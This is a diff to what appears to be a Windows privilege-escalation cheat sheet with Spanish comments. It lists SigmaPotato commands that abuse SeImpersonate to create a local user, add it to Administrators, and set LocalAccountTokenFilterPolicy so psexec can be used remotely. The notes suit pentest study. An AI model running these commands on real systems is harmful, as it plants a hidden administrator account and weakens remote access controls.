@@ -132,7 +132,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ### SeImpersonate Privilege 
 - `SigmaPotato`
 	```powershell
-	.\sigmapotato.exe "net user an0nio Password123 /add"	
+	.\sigmapotato.exe "net user an0nio Password123! /add"	
 	.\sigmapotato.exe "net localgroup Administrators an0nio /add"
 	# Evitar restricciones con LocalAccountTokenFilterPolicy, -> permite impacket-psexec
 	.\sigmapotato.exe "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
